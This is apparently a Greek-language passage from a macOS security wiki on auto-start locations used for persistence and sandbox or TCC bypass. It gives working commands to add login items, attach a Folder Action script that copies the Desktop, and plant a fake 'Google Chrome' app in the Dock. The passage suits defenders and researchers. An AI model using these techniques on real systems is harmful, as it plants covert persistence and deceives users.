- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, το BetterTouchTool πρέπει να είναι εγκατεστημένο
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
- Ζητά δικαιώματα Automation-Shortcuts και Accessibility

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Αυτό το εργαλείο επιτρέπει τον καθορισμό εφαρμογών ή scripts προς εκτέλεση όταν πατιούνται ορισμένες συντομεύσεις. Ένας attacker ενδέχεται να μπορεί να ρυθμίσει τη δική του **συντόμευση και action προς εκτέλεση στη βάση δεδομένων**, ώστε να εκτελεί arbitrary code (μια συντόμευση θα μπορούσε απλώς να πατά ένα πλήκτρο).

### Alfred

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, το Alfred πρέπει να είναι εγκατεστημένο
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
- Ζητά δικαιώματα Automation, Accessibility και ακόμη και Full-Disk access

#### Location

- `???`

Επιτρέπει τη δημιουργία workflows που μπορούν να εκτελούν code όταν πληρούνται ορισμένες συνθήκες. Ενδέχεται ένας attacker να μπορεί να δημιουργήσει ένα αρχείο workflow και να κάνει το Alfred να το φορτώσει (απαιτείται η αγορά της premium έκδοσης για τη χρήση workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, το ssh πρέπει να είναι ενεργοποιημένο και να χρησιμοποιείται
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
- Η χρήση SSH έχει πρόσβαση FDA

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Σύνδεση μέσω ssh
- **`/etc/ssh/sshrc`**
- Απαιτούνται δικαιώματα root
- **Trigger**: Σύνδεση μέσω ssh

> [!CAUTION]
> Για την ενεργοποίηση του ssh απαιτείται Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Από προεπιλογή, εκτός αν υπάρχει η ρύθμιση `PermitUserRC no` στο `/etc/ssh/sshd_config`, όταν ένας χρήστης **συνδέεται μέσω SSH**, εκτελούνται τα scripts **`/etc/ssh/sshrc`** και **`~/.ssh/rc`**.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, πρέπει να εκτελέσετε το `osascript` με args
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Σύνδεση
- Το exploit payload αποθηκεύεται καλώντας το **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Σύνδεση
- Απαιτούνται δικαιώματα root

#### Description

Στο System Preferences -> Users & Groups -> **Login Items** μπορείτε να βρείτε **items προς εκτέλεση όταν ο χρήστης συνδέεται**.\
Είναι δυνατή η καταχώριση, η προσθήκη και η αφαίρεσή τους από τη γραμμή εντολών:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Αυτά τα στοιχεία αποθηκεύονται στο αρχείο **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Τα **Login items** μπορούν **επίσης να υποδεικνύονται** μέσω του API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), το οποίο αποθηκεύει τη διαμόρφωση στο **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP ως Login Item

(Ελέγξτε την προηγούμενη ενότητα σχετικά με τα Login Items· αυτή είναι μια επέκταση.)

Αν αποθηκεύσετε ένα αρχείο **ZIP** ως **Login Item**, το **`Archive Utility`** θα το ανοίξει και, αν το zip ήταν για παράδειγμα αποθηκευμένο στο **`~/Library`** και περιείχε τον φάκελο **`LaunchAgents/file.plist`** με ένα backdoor, ο φάκελος θα δημιουργηθεί (δεν υπάρχει από προεπιλογή) και το plist θα προστεθεί, ώστε την επόμενη φορά που ο χρήστης θα συνδεθεί ξανά, να **εκτελεστεί το backdoor που υποδεικνύεται στο plist**.

Μια άλλη επιλογή θα ήταν να δημιουργήσετε τα αρχεία **`.bash_profile`** και **`.zshenv`** μέσα στο HOME του χρήστη, ώστε, αν ο φάκελος LaunchAgents υπάρχει ήδη, αυτή η τεχνική να εξακολουθεί να λειτουργεί.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Χρήσιμο για την παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, πρέπει να **εκτελέσετε** το **`at`** και πρέπει να είναι **ενεργοποιημένο**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- Πρέπει να **εκτελέσετε** το **`at`** και πρέπει να είναι **ενεργοποιημένο**

#### **Περιγραφή**

Οι εργασίες `at` έχουν σχεδιαστεί για **προγραμματισμό εργασιών μίας εκτέλεσης**, οι οποίες θα εκτελεστούν σε συγκεκριμένες χρονικές στιγμές. Σε αντίθεση με τις εργασίες cron, οι εργασίες `at` αφαιρούνται αυτόματα μετά την εκτέλεσή τους. Είναι σημαντικό να σημειωθεί ότι αυτές οι εργασίες διατηρούνται μετά από επανεκκινήσεις του συστήματος, γεγονός που υπό ορισμένες συνθήκες τις καθιστά πιθανό κίνδυνο ασφαλείας.

Από **προεπιλογή** είναι **απενεργοποιημένες**, αλλά ο χρήστης **root** μπορεί να τις **ενεργοποιήσει** με:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Αυτό θα δημιουργήσει ένα αρχείο σε 1 ώρα:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Ελέγξτε την ουρά εργασιών χρησιμοποιώντας `atq`:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Παραπάνω βλέπουμε δύο προγραμματισμένες εργασίες. Μπορούμε να εμφανίσουμε τις λεπτομέρειες της εργασίας χρησιμοποιώντας `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Αν τα AT tasks δεν είναι ενεργοποιημένα, οι εργασίες που δημιουργήθηκαν δεν θα εκτελεστούν.

Τα **αρχεία job** βρίσκονται στη διεύθυνση `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Το όνομα αρχείου περιέχει την queue, τον αριθμό του job και την ώρα που έχει προγραμματιστεί να εκτελεστεί. Για παράδειγμα, ας εξετάσουμε το `a0001a019bdcd2`.

- `a` - αυτή είναι η queue
- `0001a` - αριθμός job σε hex, `0x1a = 26`
- `019bdcd2` - χρόνος σε hex. Αντιπροσωπεύει τα λεπτά που έχουν περάσει από το epoch. Το `0x019bdcd2` είναι `26991826` σε δεκαδική μορφή. Αν το πολλαπλασιάσουμε με το 60, παίρνουμε `1619509560`, που αντιστοιχεί σε `GMT: Τρίτη, 27 Απριλίου 2021, 7:46:00`.

Αν εκτυπώσουμε το job file, διαπιστώνουμε ότι περιέχει τις ίδιες πληροφορίες που λάβαμε χρησιμοποιώντας το `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Χρήσιμο για την παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, πρέπει να μπορείτε να καλέσετε το `osascript` με arguments για να επικοινωνήσετε με το **`System Events`**, ώστε να μπορείτε να ρυθμίσετε τα Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Διαθέτει ορισμένα βασικά TCC permissions, όπως Desktop, Documents και Downloads

#### Τοποθεσία

- **`/Library/Scripts/Folder Action Scripts`**
- Απαιτείται Root
- **Trigger**: Πρόσβαση στον καθορισμένο φάκελο
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Πρόσβαση στον καθορισμένο φάκελο

#### Περιγραφή & Exploitation

Τα Folder Actions είναι scripts που ενεργοποιούνται αυτόματα από αλλαγές σε έναν φάκελο, όπως η προσθήκη ή η αφαίρεση items, ή άλλες ενέργειες, όπως το άνοιγμα ή η αλλαγή μεγέθους του παραθύρου του φακέλου. Αυτές οι ενέργειες μπορούν να χρησιμοποιηθούν για διάφορες εργασίες και να ενεργοποιηθούν με διαφορετικούς τρόπους, όπως μέσω του Finder UI ή με terminal commands.

Για να ρυθμίσετε τα Folder Actions, έχετε επιλογές όπως:

1. Δημιουργία ενός Folder Action workflow με το [Automator](https://support.apple.com/guide/automator/welcome/mac) και εγκατάστασή του ως service.
2. Χειροκίνητη σύνδεση ενός script μέσω του Folder Actions Setup στο context menu ενός φακέλου.
3. Χρήση του OSAScript για την αποστολή Apple Event messages στο `System Events.app`, ώστε να ρυθμίσετε programmatically ένα Folder Action.
- Αυτή η μέθοδος είναι ιδιαίτερα χρήσιμη για την ενσωμάτωση της action στο system, προσφέροντας ένα επίπεδο persistence.

Το ακόλουθο script είναι ένα παράδειγμα του τι μπορεί να εκτελεστεί από ένα Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Για να καταστήσετε το παραπάνω script usable από το Folder Actions, κάντε compile χρησιμοποιώντας:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Αφού γίνει compile το script, ρυθμίστε τα Folder Actions εκτελώντας το παρακάτω script. Αυτό το script θα ενεργοποιήσει τα Folder Actions καθολικά και θα επισυνάψει συγκεκριμένα το προηγουμένως compiled script στον φάκελο Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Εκτελέστε το script εγκατάστασης με:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Αυτός είναι ο τρόπος για να υλοποιήσετε αυτό το persistence μέσω GUI:

Αυτό είναι το script που θα εκτελεστεί:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Κάντε compile με: `osacompile -l JavaScript -o folder.scpt source.js`

Μετακινήστε το στο:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Στη συνέχεια, ανοίξτε την εφαρμογή `Folder Actions Setup`, επιλέξτε τον **φάκελο που θέλετε να παρακολουθείτε** και, στην περίπτωσή σας, επιλέξτε το **`folder.scpt`** (στη δική μου περίπτωση το ονόμασα output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Τώρα, αν ανοίξετε αυτόν τον φάκελο με το **Finder**, το script σας θα εκτελεστεί.

Αυτή η ρύθμιση αποθηκεύτηκε στο **plist** που βρίσκεται στο **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** σε μορφή base64.

Τώρα, ας προσπαθήσουμε να προετοιμάσουμε αυτό το persistence χωρίς πρόσβαση σε GUI:

1. **Αντιγράψτε το `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** στο `/tmp` για να δημιουργήσετε backup:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Αφαιρέστε** τα Folder Actions που μόλις ρυθμίσατε:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Τώρα που έχουμε ένα κενό περιβάλλον

3. Αντιγράψτε το backup file: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Ανοίξτε το Folder Actions Setup.app για να φορτώσει αυτήν τη ρύθμιση: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Αυτό δεν λειτούργησε για εμένα, αλλά αυτές είναι οι οδηγίες από το writeup:(

### Συντομεύσεις Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, πρέπει να έχετε εγκαταστήσει μια malicious εφαρμογή μέσα στο σύστημα
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Όταν ο χρήστης κάνει κλικ στην εφαρμογή μέσα στο Dock

#### Περιγραφή & Exploitation

Όλες οι εφαρμογές που εμφανίζονται στο Dock καθορίζονται μέσα στο plist: **`~/Library/Preferences/com.apple.dock.plist`**

Είναι δυνατό να **προσθέσετε μια εφαρμογή** απλώς με:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Χρησιμοποιώντας λίγο **social engineering**, θα μπορούσατε να **παριστάνετε, για παράδειγμα, το Google Chrome** μέσα στο dock και να εκτελέσετε στην πράξη το δικό σας script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Χρήσιμο για bypass του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Πρέπει να πραγματοποιηθεί μια πολύ συγκεκριμένη ενέργεια
- Θα καταλήξετε σε ένα άλλο sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Απαιτείται Root
- Trigger: Χρησιμοποιήστε το color picker
- `~/Library/ColorPickers`
- Trigger: Χρησιμοποιήστε το color picker

#### Description & Exploit

**Κάντε compile ένα** color picker **bundle** με τον κώδικά σας (θα μπορούσατε να χρησιμοποιήσετε [**αυτό, για παράδειγμα**](https://github.com/viktorstrate/color-picker-plus)) και προσθέστε έναν constructor (όπως στην ενότητα [Screen Saver](macos-auto-start-locations.md#screen-saver)) και αντιγράψτε το bundle στο `~/Library/ColorPickers`.

Στη συνέχεια, όταν ενεργοποιηθεί το color picker, θα πρέπει να ενεργοποιηθεί και ο κώδικάς σας.

Σημειώστε ότι το binary που φορτώνει τη βιβλιοθήκη σας έχει ένα **πολύ περιοριστικό sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Χρήσιμο για bypass του sandbox: **Όχι, επειδή πρέπει να εκτελέσετε τη δική σας εφαρμογή**
- TCC bypass: ???

#### Τοποθεσία

- Μια συγκεκριμένη εφαρμογή

#### Περιγραφή & Exploit

Ένα παράδειγμα εφαρμογής με Finder Sync Extension [**μπορεί να βρεθεί εδώ**](https://github.com/D00MFist/InSync).

Οι εφαρμογές μπορούν να έχουν `Finder Sync Extensions`. Αυτό το extension θα βρίσκεται μέσα σε μια εφαρμογή που θα εκτελεστεί. Επιπλέον, για να μπορεί το extension να εκτελέσει τον κώδικά του, **πρέπει να είναι υπογεγραμμένο** με κάποιο έγκυρο Apple developer certificate, πρέπει να είναι **sandboxed** (αν και μπορούν να προστεθούν relaxed exceptions) και πρέπει να έχει καταχωριστεί με κάτι όπως:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ωστόσο, θα καταλήξετε σε ένα common application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- `/System/Library/Screen Savers`
- Απαιτείται root
- **Trigger**: Επιλέξτε το screen saver
- `/Library/Screen Savers`
- Απαιτείται root
- **Trigger**: Επιλέξτε το screen saver
- `~/Library/Screen Savers`
- **Trigger**: Επιλέξτε το screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Περιγραφή & Exploit

Δημιουργήστε ένα νέο project στο Xcode και επιλέξτε το template για τη δημιουργία ενός νέου **Screen Saver**. Στη συνέχεια, προσθέστε τον κώδικά σας, για παράδειγμα τον παρακάτω κώδικα για τη δημιουργία logs.

Κάντε **Build** και αντιγράψτε το bundle `.saver` στο **`~/Library/Screen Savers`**. Έπειτα, ανοίξτε το Screen Saver GUI και, αν απλώς κάνετε κλικ πάνω του, θα πρέπει να δημιουργηθούν πολλά logs:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Σημειώστε ότι, επειδή μέσα στα entitlements του binary που φορτώνει αυτόν τον κώδικα (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) μπορείτε να βρείτε το **`com.apple.security.app-sandbox`**, θα βρίσκεστε **μέσα στο κοινό application sandbox**.

Κώδικας Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Χρήσιμα για την παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ωστόσο, θα καταλήξετε σε ένα application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Το sandbox φαίνεται πολύ περιορισμένο

#### Τοποθεσία

- `~/Library/Spotlight/`
- **Trigger**: Δημιουργείται ένα νέο αρχείο με extension που διαχειρίζεται το spotlight plugin.
- `/Library/Spotlight/`
- **Trigger**: Δημιουργείται ένα νέο αρχείο με extension που διαχειρίζεται το spotlight plugin.
- Απαιτούνται δικαιώματα root
- `/System/Library/Spotlight/`
- **Trigger**: Δημιουργείται ένα νέο αρχείο με extension που διαχειρίζεται το spotlight plugin.
- Απαιτούνται δικαιώματα root
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Δημιουργείται ένα νέο αρχείο με extension που διαχειρίζεται το spotlight plugin.
- Απαιτείται νέα εφαρμογή

#### Περιγραφή & Exploitation

Το Spotlight είναι η ενσωματωμένη λειτουργία αναζήτησης του macOS, σχεδιασμένη να παρέχει στους χρήστες **γρήγορη και ολοκληρωμένη πρόσβαση στα δεδομένα των υπολογιστών τους**.\
Για να διευκολύνει αυτή τη γρήγορη δυνατότητα αναζήτησης, το Spotlight διατηρεί μια **ιδιόκτητη database** και δημιουργεί ένα index **αναλύοντας τα περισσότερα αρχεία**, επιτρέποντας γρήγορες αναζητήσεις τόσο στα ονόματα των αρχείων όσο και στο περιεχόμενό τους.

Ο υποκείμενος μηχανισμός του Spotlight περιλαμβάνει μια κεντρική διεργασία με το όνομα 'mds', το οποίο σημαίνει **'metadata server'.** Αυτή η διεργασία συντονίζει ολόκληρη την υπηρεσία Spotlight. Παράλληλα, υπάρχουν πολλαπλά daemons `mdworker` που εκτελούν διάφορες εργασίες συντήρησης, όπως το indexing διαφορετικών τύπων αρχείων (`ps -ef | grep mdworker`). Αυτές οι εργασίες είναι δυνατές μέσω των Spotlight importer plugins ή των **".mdimporter bundles**", τα οποία επιτρέπουν στο Spotlight να κατανοεί και να κάνει index στο περιεχόμενο μιας μεγάλης ποικιλίας formats αρχείων.

Τα plugins ή τα **`.mdimporter`** bundles βρίσκονται στις τοποθεσίες που αναφέρθηκαν προηγουμένως και, αν εμφανιστεί ένα νέο bundle, φορτώνεται μέσα σε ένα λεπτό (δεν χρειάζεται επανεκκίνηση κάποιας υπηρεσίας). Αυτά τα bundles πρέπει να δηλώνουν **ποιον τύπο αρχείου και ποια extensions μπορούν να διαχειριστούν**, ώστε το Spotlight να τα χρησιμοποιεί όταν δημιουργείται ένα νέο αρχείο με το υποδεικνυόμενο extension.

Είναι δυνατή η **εύρεση όλων των `mdimporters`** που έχουν φορτωθεί, εκτελώντας:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Και, για παράδειγμα, το **/Library/Spotlight/iBooksAuthor.mdimporter** χρησιμοποιείται για την ανάλυση αυτού του τύπου αρχείων (μεταξύ άλλων, των επεκτάσεων `.iba` και `.book`):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Αν ελέγξετε το Plist κάποιου άλλου `mdimporter`, ενδέχεται να μη βρείτε την καταχώριση **`UTTypeConformsTo`**. Αυτό συμβαίνει επειδή πρόκειται για ένα ενσωματωμένο _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) και δεν χρειάζεται να καθορίζει extensions.
>
> Επιπλέον, τα προεπιλεγμένα plugins του συστήματος έχουν πάντα προτεραιότητα, επομένως ένας attacker μπορεί να αποκτήσει πρόσβαση μόνο σε αρχεία που δεν γίνονται με άλλο τρόπο indexed από τα `mdimporters` της Apple.

Για να δημιουργήσετε το δικό σας importer, μπορείτε να ξεκινήσετε με αυτό το project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), στη συνέχεια να αλλάξετε το όνομα και το **`CFBundleDocumentTypes`** και να προσθέσετε το **`UTImportedTypeDeclarations`**, ώστε να υποστηρίζει το extension που θέλετε, και να τα αντικατοπτρίσετε στο **`schema.xml`**.\
Στη συνέχεια, **αλλάξτε** τον κώδικα της συνάρτησης **`GetMetadataForFile`**, ώστε να εκτελεί το payload σας όταν δημιουργείται ένα αρχείο με το υποστηριζόμενο extension.

Τέλος, κάντε **build και αντιγράψτε το νέο `.mdimporter`** σε μία από τις τρεις προηγούμενες τοποθεσίες και μπορείτε να ελέγξετε πότε φορτώνεται **παρακολουθώντας τα logs** ή ελέγχοντας το **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> Δεν φαίνεται να λειτουργεί πλέον.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Χρήσιμο για sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Απαιτεί συγκεκριμένη ενέργεια από τον χρήστη
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Δεν φαίνεται να λειτουργεί πλέον.

## Root Sandbox Bypass

> [!TIP]
